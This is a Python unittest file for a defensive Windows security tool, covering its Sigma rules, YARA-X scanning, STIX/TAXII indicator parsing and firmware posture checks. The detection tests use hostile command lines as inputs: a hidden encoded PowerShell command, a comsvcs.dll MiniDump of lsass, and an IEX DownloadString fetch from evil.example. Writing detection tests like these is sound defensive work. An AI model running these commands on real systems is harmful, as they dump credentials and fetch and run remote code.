"""Tests for the v29.46 community-detection layer:
sigma_engine, yara_x_engine, stix_taxii_feed, firmware_posture + wiring."""
import importlib
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

sigma_engine = importlib.import_module('sigma_engine')
yara_x_engine = importlib.import_module('yara_x_engine')
stix_taxii_feed = importlib.import_module('stix_taxii_feed')
firmware_posture = importlib.import_module('firmware_posture')


class TestSigmaEngine(unittest.TestCase):
    def setUp(self):
        sigma_engine.reload_rules()

    def test_bundled_rules_load(self):
        rules = sigma_engine.get_rules()
        self.assertGreaterEqual(len(rules), 20)
        for r in rules:
            self.assertIn('title', r)
            self.assertIn('detection', r)
            self.assertIn('id', r)

    def test_encoded_powershell_hits(self):
        findings = sigma_engine.match_process(
            r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
            'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoTmV3')
        titles = [f.title for f in findings]
        self.assertIn('PowerShell Encoded Command', titles)
        f = next(f for f in findings
                 if f.title == 'PowerShell Encoded Command')
        self.assertEqual(f.level, 'HIGH')
        self.assertEqual(f.technique, 'T1059.001')

    def test_comsvcs_minidump_all_of_selection(self):
        findings = sigma_engine.match_process(
            r'C:\Windows\System32\rundll32.exe',
            r'rundll32.exe C:\Windows\System32\comsvcs.dll,'
            r' MiniDump 824 C:\temp\lsass.dmp full')
        self.assertTrue(any('comsvcs' in f.title.lower() or
                            'MiniDump' in f.title for f in findings))

    def test_office_parent_child(self):
        findings = sigma_engine.match_process(
            r'C:\Windows\System32\cmd.exe', 'cmd.exe /c drop.bat',
            parent_image=r'C:\Program Files\Microsoft Office'
                         r'\root\Office16\WINWORD.EXE')
        self.assertTrue(any('Office' in f.title for f in findings))

    def test_clean_process_no_fp(self):
        findings = sigma_engine.match_process(
            r'C:\Windows\System32\notepad.exe', 'notepad.exe notes.txt')
        self.assertEqual(findings, [])

    def test_script_block_match(self):
        findings = sigma_engine.match_script_block(
            'IEX (New-Object Net.WebClient).DownloadString'
            "('http://evil.example/x.ps1')")
        self.assertTrue(any(f.source == 'script_block' for f in findings))

    def test_yaml_subset_parser(self):
        yml = (
            'title: Test Rule\n'
            'id: 11111111-2222-3333-4444-555555555555\n'
            'status: stable\n'
            'description: |\n'
            '    line one\n'
            '    line two\n'
            'logsource:\n'
            '    category: process_creation\n'
            '    product: windows\n'
            'detection:\n'
            '    selection:\n'
            "        Image|endswith: '\\evil.exe'\n"
            '        CommandLine|contains:\n'
            "            - '-enc'\n"
            "            - '/encodedcommand'\n"
            '    condition: selection\n'
            'tags:\n'
            '    - attack.execution\n'
            '    - attack.t1059.001\n'
            'level: high\n'
        )
        data = sigma_engine._minimal_yaml_load(yml)
        self.assertIsNotNone(data)
        self.assertEqual(data['title'], 'Test Rule')
        self.assertEqual(data['logsource']['category'], 'process_creation')
        self.assertEqual(data['detection']['selection'][
            'Image|endswith'], '\\evil.exe')
        self.assertEqual(data['detection']['selection'][
            'CommandLine|contains'], ['-enc', '/encodedcommand'])
        self.assertEqual(data['tags'],
                         ['attack.execution', 'attack.t1059.001'])
        self.assertIn('line one', data['description'])

    def test_user_rules_loaded_from_dir(self):
        tmp = tempfile.mkdtemp(prefix='dp_sigma_')
        rule = {
            'title': 'Custom User Rule', 'id': '99999999-8888-7777-6666'
                                                  '-555555555555',
            'logsource': {'category': 'process_creation',
                          'product': 'windows'},
            'detection': {'selection': {
                'CommandLine|contains': ['__definitely_unique_marker__']},
                'condition': 'selection'},
            'level': 'high', 'tags': ['attack.t1059']}
        with open(os.path.join(tmp, 'custom.json'), 'w',
                  encoding='utf-8') as f:
            json.dump(rule, f)
        try:
            user = sigma_engine.load_user_rules(directory=Path(tmp))
            self.assertEqual(len(user), 1)
            sigma_engine._loaded_rules = None
            with mock.patch.object(sigma_engine, 'USER_RULES_DIR',
                                   Path(tmp)):
                findings = sigma_engine.match_process(
                    r'C:\x\evil.exe', 'evil.exe __definitely_unique_marker__')
            self.assertTrue(any(f.title == 'Custom User Rule'
                                for f in findings))
        finally:
            sigma_engine._loaded_rules = None

    def test_engine_info(self):
        info = sigma_engine.get_engine_info()
        self.assertIn('total', info)
        self.assertGreaterEqual(info['bundled'], 20)


class TestYaraXEngine(unittest.TestCase):
    def test_engine_available(self):
        info = yara_x_engine.get_engine_info()
        self.assertIn(info['engine'], ('yara-x', 'yara-python'))
        self.assertGreaterEqual(info['rulesets'], 10)

    def test_scan_bytes_match_and_clean(self):
        yara_x_engine.get_engine().compile_rulesets()
        clean = yara_x_engine.scan_bytes(b'innocent buffer ' * 64)
        self.assertIsInstance(clean, list)
        # scan the test runner itself — always a real executable on disk
        result = yara_x_engine.scan_file(__file__)
        self.assertIn('matches', result)
        self.assertEqual(result['error'], '')

    def test_scan_file_shape(self):
        result = yara_x_engine.scan_file(os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            '.venv', 'Scripts', 'python.exe'))
        self.assertIn('path', result)
        self.assertIn('matches', result)
        for m in result['matches']:
            self.assertIn('rule', m)
            self.assertIn('namespace', m)

    def test_oversize_file_flagged(self):
        with mock.patch.object(yara_x_engine, 'MAX_SCAN_SIZE', 8):
            result = yara_x_engine.scan_file(__file__)
        self.assertIn('too large', result['error'])


class TestStixTaxii(unittest.TestCase):
    def test_pattern_extraction(self):
        objs = [
            {'type': 'indicator',
             'pattern': "[ipv4-addr:value = '185.220.101.45']",
             'name': 'tor exit'},
            {'type': 'indicator',
             'pattern': "[domain-name:value = 'evil.example']",
             'name': 'c2'},
            {'type': 'indicator',
             'pattern': "[url:value = 'http://evil.example/p']",
             'name': 'c2'},
            {'type': 'indicator',
             'pattern': "[file:hashes.'SHA-256' = " + "'" + 'a' * 64 + "']",
             'name': 'dropper'},
            {'type': 'indicator',
             'pattern': "[windows-registry-key:key = "
                        "'HKEY_LOCAL_MACHINE\\\\Software\\\\Evil']",
             'name': 'reg'},
            {'type': 'malware', 'name': 'not an indicator'},
        ]
        inds = stix_taxii_feed.extract_indicators(objs, 't')
        types = {i['type'] for i in inds}
        self.assertIn('ip', types)
        self.assertIn('domain', types)
        self.assertIn('url', types)
        self.assertIn('hash', types)
        self.assertIn('registry', types)
        values = {i['value'] for i in inds}
        self.assertIn('185.220.101.45', values)

    def test_extraction_dedupes(self):
        objs = [
            {'type': 'indicator',
             'pattern': "[ipv4-addr:value = '1.2.3.4']", 'name': 'x'},
            {'type': 'indicator',
             'pattern': "[ipv4-addr:value = '1.2.3.4']", 'name': 'y'},
        ]
        self.assertEqual(
            len(stix_taxii_feed.extract_indicators(objs, 't')), 1)

    def test_sync_disabled_by_default(self):
        res = stix_taxii_feed.sync_once(config={'enabled': False})
        self.assertFalse(res['enabled'])
        self.assertEqual(res['indicators'], [])

    def test_config_round_trip(self):
        tmp = tempfile.mkdtemp(prefix='dp_stix_')
        p = Path(tmp) / 'stix_taxii_config.json'
        cfg = stix_taxii_feed.default_config()
        self.assertTrue(stix_taxii_feed.save_config(cfg, path=p))
        loaded = stix_taxii_feed.load_config(path=p)
        self.assertEqual(loaded['enabled'], False)
        self.assertEqual(len(loaded['servers']), 1)

    def test_pagination_with_fake_session(self):
        pages = [
            {'more': True, 'next': 'cursor-1',
             'objects': [{'type': 'indicator',
                          'pattern': "[ipv4-addr:value = '9.9.9.9']",
                          'name': 'p1'}]},
            {'more': False,
             'objects': [{'type': 'indicator',
                          'pattern': "[ipv4-addr:value = '8.8.8.8']",
                          'name': 'p2'}]},
        ]
        calls = []

        class FakeResp:
            def __init__(self, payload):
                self.status_code = 200
                self._payload = payload

            def json(self):
                return self._payload

            def raise_for_status(self):
                pass

        class FakeSession:
            def request(self, method, url, **kw):
                calls.append((url, kw.get('params')))
                return FakeResp(pages[len(calls) - 1])

        server = {'name': 'fake',
                  'discovery_url': 'https://x/taxii2/',
                  'collection_ids': ['*'], 'max_objects': 1000}
        client = stix_taxii_feed.TAXII21Client(
            server, session=FakeSession())
        objs, err = client.fetch_objects(
            'https://x/api/root/', 'col-1', max_objects=1000)
        self.assertEqual(err, '')
        self.assertEqual(len(objs), 2)
        self.assertEqual(calls[-1][1].get('next'), 'cursor-1')
        inds = stix_taxii_feed.extract_indicators(objs, 'fake')
        self.assertEqual({i['value'] for i in inds}, {'9.9.9.9', '8.8.8.8'})


class TestFirmwarePosture(unittest.TestCase):
    def _patch_reg(self, table):
        """table: {(subkey, value): data} — anything missing → None."""
        def fake_get(root, subkey, value):
            return table.get((subkey, value))
        return mock.patch.object(firmware_posture, '_reg_get', fake_get)

    @staticmethod
    def _patch_ps(output_by_cmd):
        def fake_ps(command):
            for needle, out in output_by_cmd.items():
                if needle in command:
                    return out
            return None
        return mock.patch.object(firmware_posture, '_ps', fake_ps)

    def test_bitlocker_off_is_high(self):
        js = ('[{"MountPoint":"C:","VolumeStatus":"FullyDecrypted",'
              '"ProtectionStatus":"Off"}]')
        with self._patch_ps({'Get-BitLockerVolume': js}):
            alerts, status = firmware_posture.check_bitlocker()
        self.assertEqual(status, 'unprotected')
        self.assertEqual(alerts[0].severity, 'HIGH')
        self.assertEqual(alerts[0].technique, 'T1490')

    def test_bitlocker_on_silent(self):
        js = ('[{"MountPoint":"C:","VolumeStatus":"Used",'
              '"ProtectionStatus":"On"}]')
        with self._patch_ps({'Get-BitLockerVolume': js}):
            alerts, status = firmware_posture.check_bitlocker()
        self.assertEqual(status, 'protected')
        self.assertEqual(alerts, [])

    def test_bitlocator_unknown_without_tools(self):
        with self._patch_ps({}):
            alerts, status = firmware_posture.check_bitlocker()
        self.assertEqual(status, 'unknown')
        self.assertEqual(alerts, [])

    def test_secure_boot_registry_fallback(self):
        with self._patch_reg({
                (r'SYSTEM\CurrentControlSet\Control\SecureBoot\State',
                 'UEFISecureBootEnabled'): 0}):
            alerts, status = firmware_posture.check_secure_boot()
        self.assertEqual(status, 'disabled')
        self.assertEqual(alerts[0].technique, 'T1542')

    def test_smb1_enabled_is_high(self):
        with self._patch_reg({
                (r'SYSTEM\CurrentControlSet\Services\LanmanServer'
                 r'\Parameters', 'SMB1'): 1}):
            alerts, status = firmware_posture.check_smb1()
        self.assertEqual(status, 'enabled')
        self.assertEqual(alerts[0].severity, 'HIGH')

    def test_wuauserv_disabled_is_high(self):
        with self._patch_reg({
                (r'SYSTEM\CurrentControlSet\Services\wuauserv',
                 'Start'): 4}):
            alerts, status = firmware_posture.check_patch_service()
        self.assertEqual(status, 'disabled')
        self.assertEqual(alerts[0].severity, 'HIGH')

    def test_lsa_ppl_missing_is_high(self):
        with self._patch_reg({}):
            alerts, status = firmware_posture.check_lsa_ppl()
        self.assertEqual(status, 'disabled')
        self.assertEqual(alerts[0].severity, 'HIGH')

    def test_lsa_ppl_enabled_silent(self):
        with self._patch_reg({
                (r'SYSTEM\CurrentControlSet\Control\Lsa', 'RunAsPPL'): 1}):
            alerts, status = firmware_posture.check_lsa_ppl()
        self.assertEqual(status, 'enabled')
        self.assertEqual(alerts, [])

    def test_collect_posture_never_raises(self):
        with self._patch_ps({}), self._patch_reg({}):
            alerts, status = firmware_posture.collect_posture()
        self.assertIsInstance(alerts, list)
        self.assertIsInstance(status, dict)
        self.assertGreaterEqual(len(status), 7)

    def test_run_all_firmware_checks_wiring_shape(self):
        alerts = firmware_posture.run_all_firmware_checks()
        self.assertIsInstance(alerts, list)


class TestV2946Wiring(unittest.TestCase):
    """Source-structure tests — main file read as text, never imported."""
    MAIN = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'downpour_v29_titanium.py')

    @classmethod
    def setUpClass(cls):
        with open(cls.MAIN, encoding='utf-8', errors='replace') as f:
            cls.src = f.read()

    def test_sigma_wired(self):
        self.assertIn('import sigma_engine', self.src)
        self.assertIn('SIGMA_ENGINE_AVAILABLE', self.src)
        self.assertIn('_sigma_alert_bridge', self.src)
        self.assertIn('_sigma_process_loop', self.src)
        self.assertIn('_sigma_script_block_scan', self.src)
        self.assertIn('[SIGMA]', self.src)
        self.assertIn('_sigma_engine_started', self.src)

    def test_yara_x_wired(self):
        self.assertIn('import yara_x_engine', self.src)
        self.assertIn('YARA_X_ENGINE_AVAILABLE', self.src)

    def test_firmware_wired(self):
        self.assertIn('import firmware_posture', self.src)
        self.assertIn('FIRMWARE_POSTURE_AVAILABLE', self.src)
        self.assertIn('_firmware_alert_bridge', self.src)
        self.assertIn('_firmware_posture_oneshot', self.src)
        self.assertIn('[FIRMWARE]', self.src)
        self.assertIn('_firmware_posture_started', self.src)

    def test_stix_wired(self):
        self.assertIn('import stix_taxii_feed', self.src)
        self.assertIn('STIX_TAXII_AVAILABLE', self.src)
        self.assertIn('_stix_taxii_oneshot', self.src)
        self.assertIn('_stix_taxii_started', self.src)

    def test_new_feeds_present(self):
        for feed in ('firehol_l1_v', 'firehol_l2_v', 'firehol_l3_v',
                     'spamhaus_drop_v', 'bruteforceblocker', 'cinsarmy_v'):
            self.assertIn(f"'{feed}'", self.src)
        self.assertIn('firehol_level1.netset', self.src)

    def test_event_log_bridge_intact(self):
        # the v29.46 insert sits before this v29.44b bridge — both must
        # exist as proper method definitions
        self.assertIn('def _event_log_alert_bridge(self, alert):', self.src)
        self.assertIn('[WIN-EVT]', self.src)

    def test_bridges_use_gauge_colors(self):
        self.assertNotIn('Colors.ALERT_', self.src)


if __name__ == '__main__':
    unittest.main()
